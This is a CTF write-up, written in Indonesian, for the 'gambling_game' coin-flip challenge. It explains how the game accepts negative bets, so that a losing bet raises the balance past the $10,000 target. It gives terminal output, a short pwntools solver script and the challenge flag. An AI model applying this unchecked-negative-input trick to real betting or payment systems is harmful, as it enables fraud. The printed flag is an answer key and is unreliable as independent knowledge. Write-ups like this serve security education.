# WriteUp - gambling_game

## Overview
- **Judul:** gambling_game
- **Kategori:** Pwn / Logic Bug
- **Poin:** 50
- **Author:** Aterlone
- **Akses:** `nc chals.vuwctf.com 9999`
- **Deskripsi:** Welcome to the Lucky Casino! Try your luck at our coin flip game. You start with $100 and need to reach $10,000 to win the jackpot and get the flag! The game is simple: bet some money, choose heads or tails, and if you guess correctly, you double your bet! Can you beat the house and claim the grand prize?

## Informasi Attachment
Tidak ada attachment file *binary* atau *source code* yang diberikan pada *challenge* ini. Akses murni dilakukan secara *remote* melalui koneksi Netcat. Karena tidak ada *binary*, proses analisis menggunakan decompiler seperti Ghidra atau IDA Pro tidak dapat dilakukan.

## Proses Penyelesaian
1. **Analisis Interaksi Awal:** Melakukan koneksi ke server melalui Netcat untuk memahami alur program. Program akan meminta input jumlah taruhan (*betting*) dan tebakan sisi koin (*heads* atau *tails*).
2. **Identifikasi Kerentanan:** Menguji eksistensi *logic bug* yang sangat umum terjadi pada program berbasis CLI sederhana yang memanipulasi angka, yaitu kerentanan *Negative Betting*.
3. **Eksploitasi Logika (Negative Betting):** Mengirimkan input nilai taruhan bernilai negatif yang cukup besar, dalam hal ini `-10000` atau `-100000`. Program tidak memiliki mekanisme validasi untuk menolak angka minus.
4. **Memicu Kondisi Menguntungkan:** Memasukkan tebakan koin secara acak dan berharap hasil undiannya adalah **kalah**. Saat sistem mendeteksi kekalahan, logika program akan mengurangi saldo saat ini dengan jumlah taruhan. Operasi matematis yang berjalan pada *backend* menjadi `saldo_awal - (-nilai_taruhan)`. Karena minus bertemu minus menghasilkan operasi penjumlahan, saldo justru bertambah drastis secara instan.
5. **Mendapatkan Flag:** Akibat penambahan *balance* yang masif, saldo langsung melampaui batas target kemenangan `$10,000`. Sistem menganggap pemain telah memenangkan *jackpot* dan seketika mencetak *flag* ke terminal.

## Output Terminal (Eksploitasi Manual)
```text
 󰋑  ▶  nc chals.vuwctf.com 9999
You start with $100
Win $10,000 to get the flag!

Current balance: $100
How much would you like to bet? -10000
Heads (1) or Tails (2)? 1

🪙 The coin landed on TAILS!
😞 You lost! Better luck next time.
New balance: $10100

🎉 Congratulations! You won the jackpot! 🎉
Here's your flag: VuwCTF{n3g4t1v3_b3ts_4r3_ch34t1ng}
```

## Script Solver
```python
from pwn import *

def solve():
    host = "chals.vuwctf.com"
    port = 9999
    
    log.info(f"Connecting to {host}:{port}...")
    r = remote(host, port)

    r.recvuntil(b"How much would you like to bet?")
    
    # Inject logic bug: Taruhan dengan nilai negatif yang sangat besar
    bet_amount = b"-100000"
    log.info(f"Sending negative bet: {bet_amount.decode()}")
    r.sendline(bet_amount)

    r.recvuntil(b"Heads (1) or Tails (2)?")
    
    # Pilih 1 (Heads) secara asal untuk memicu kondisi kalah
    log.info("Choosing 1 (Heads)...")
    r.sendline(b"1")

    r.interactive()

if __name__ == "__main__":
    solve()
```

## Output Terminal (Script Solver)
```text
 󰋑  ▶  ./solver.py
[*] Connecting to chals.vuwctf.com:9999...
[+] Opening connection to chals.vuwctf.com on port 9999: Done
[*] Sending negative bet: -100000
[*] Choosing 1 (Heads)...
[*] Switching to interactive mode

🪙 The coin landed on TAILS!
😞 You lost! Better luck next time.
New balance: $100100

🎉 Congratulations! You won the jackpot! 🎉
Here's your flag: VuwCTF{n3g4t1v3_b3ts_4r3_ch34t1ng}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to chals.vuwctf.com port 9999
```

## Flag
```text
VuwCTF{n3g4t1v3_b3ts_4r3_ch34t1ng}
```
